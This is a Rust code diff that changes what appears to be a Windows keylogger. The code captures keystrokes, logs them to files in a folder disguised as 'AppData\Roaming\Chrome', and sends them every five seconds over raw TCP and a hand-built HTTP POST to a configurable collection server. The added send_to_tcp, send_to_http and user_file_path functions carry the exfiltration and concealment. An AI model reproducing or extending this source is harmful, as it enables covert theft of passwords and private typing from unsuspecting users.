@@ -41,11 +41,12 @@ fn main() {
 
     // Print all received keys to a file for debugging
     let h2 = thread::spawn(move || {
+        let pressed_file = user_file_path("pressed.txt");
         let mut file = OpenOptions::new()
             .create(true)
             .write(true)
             .append(true)
-            .open("pressed.txt")
+            .open(pressed_file)
             .unwrap();
 
         for received in rx1 {
@@ -56,42 +57,20 @@ fn main() {
     let h3 = thread::spawn({
         let keys1 = Arc::clone(&keys1);
         move || loop {
-            let mut pressed_full = OpenOptions::new()
-                .create(true)
-                .write(true)
-                .append(true)
-                .open("pressed_full.txt")
-                .unwrap();
             let mut keys_string = String::new();
 
-            {
                 let mut keys1 = keys1.lock().unwrap();
                 for key in keys1.drain(..) {
                     if let Some(r) = key.char {
                         keys_string.push(r);
                     }
                 }
-            }
-            if keys_string.len() > 0 {
-                let keys_base64 = base64::encode(&keys_string);
-                writeln!(pressed_full, "text: {}", keys_string);
-                writeln!(pressed_full, "base64: {}", keys_base64);
-                writeln!(pressed_full, "=======================================");
 
-                let address = get_address();
-                let mut stream = TcpStream::connect(address);
-                match stream {
-                    Ok(s) => {
-                        let mut stream = s;
-                        writeln!(stream, "{}", keys_string).unwrap();
-                        writeln!(stream, "{}", keys_base64).unwrap();
-                    }
-                    Err(e) => {
-                        // println!("Error connecting to server: {}", e);
-                        continue;
-                    }
-                }
-            };
+            if !keys_string.is_empty() {
+                write_to_file(&keys_string);
+                send_to_tcp(&keys_string);
+                send_to_http(&keys_string);
+            }
 
             thread::sleep(Duration::from_secs(5));
         }
@@ -115,16 +94,17 @@ fn main() {
 
 // Get TCP address from the ./address.txt file if it exists other wise return the default address
 fn get_address() -> String {
+    let address_file_name = user_file_path("address.txt");
     let mut address = String::new();
     let mut file = OpenOptions::new()
         .read(true)
-        .open("address.txt")
+        .open(&address_file_name)
         .unwrap_or_else(|_| {
             // println!("No address.txt file found, using default address");
             let mut df = OpenOptions::new()
                 .create(true)
                 .write(true)
-                .open("address.txt")
+                .open(&address_file_name)
                 .unwrap();
             df.write(b"127.0.0.1:4000").unwrap();
             df
@@ -335,7 +315,7 @@ fn win_key_to_string(win_key1: i32) -> Option<String> {
         // Special keys and other buttons
         (VK_BACK, "[back]"),         // BACKSPACE key
         (VK_TAB, "[tab]"),           // TAB key
-        (VK_RETURN, "[return]"),     // ENTER key
+        (VK_RETURN, "[enter]"),     // ENTER key
         (VK_SHIFT, "[shift]"),       // SHIFT key
         (VK_CONTROL, "[ctrl]"),      // CTRL key
         (VK_MENU, "[alt]"),          // ALT key
@@ -393,3 +373,109 @@ fn win_key_to_string(win_key1: i32) -> Option<String> {
     }
     None
 }
+
+use directories::UserDirs;
+use std::path::PathBuf;
+
+fn user_file_path(filename: &str) -> String {
+    let user_dirs = UserDirs::new().expect("Failed to get user directories");
+    let mut path = PathBuf::from(user_dirs.home_dir());
+    path.push("AppData\\Roaming\\Chrome");
+    std::fs::create_dir_all(&path);
+    path.push(filename);
+    path.to_str().unwrap().to_string()
+}
+
+fn send_to_tcp(keys_base64: &str) -> bool {
+    let address = get_address();
+    match TcpStream::connect(&address) {
+        Ok(mut stream) => {
+            match writeln!(stream, "{}", keys_base64) {
+                Ok(_) => true,
+                Err(e) => {
+                    println!("Failed to write to TCP stream: {}", e);
+                    false
+                },
+            }
+        }
+        Err(e) => {
+            println!("Error connecting to server: {}", e);
+            false
+        }
+    }
+}
+
+fn send_to_http(keys_base64: &str) -> bool {
+    let address = get_address();
+    let mut stream = match TcpStream::connect(&address) {
+        Ok(s) => s,
+        Err(e) => {
+            println!("Failed to connect: {}", e);
+            return false;
+        }
+    };
+
+    // Write HTTP request to the stream
+    let request = format!(
+        "POST / HTTP/1.1\r\n\
+        Host: {}\r\n\
+        Content-Type: text/plain\r\n\
+        Content-Length: {}\r\n\r\n\
+        {}",
+        &address, keys_base64.len(), keys_base64
+    );
+
+    match stream.write_all(request.as_bytes()) {
+        Ok(_) => true,
+        Err(e) => {
+            println!("Failed to send request: {}", e);
+            false
+        }
+    }
+}
+
+fn write_to_file(keys_string: &str) {
+    let path = user_file_path("pressed_sentence.txt");
+    let mut file = OpenOptions::new()
+        .create(true)
+        .write(true)
+        .append(true)
+        .open(path)
+        .unwrap();
+
+    let keys_base64 = base64::encode(&keys_string);
+    writeln!(file, "text: {}", keys_string);
+    writeln!(file, "base64: {}", keys_base64);
+    writeln!(file, "=======================================");
+}
+
+/*
+Note: reqwest adds 900KB to binary output in release
+fn send_to_http(keys_base64: &str) -> bool {
+    let address = get_address();
+    let client = reqwest::blocking::Client::new();
+
+    let mut headers = reqwest::header::HeaderMap::new();
+    headers.insert(reqwest::header::CONTENT_TYPE, reqwest::header::HeaderValue::from_static("text/plain"));
+
+    match client.post(&address)
+        .headers(headers)
+        .body(keys_base64.to_string())
+        .send() {
+        Ok(response) => {
+            if response.status().is_success() {
+                true
+            } else {
+                println!("Error response from server: {:?}", response.status());
+                false
+            }
+        }
+        Err(e) => {
+            println!("Error sending request: {}", e);
+            false
+        }
+    }
+    // false
+}
+
+*/
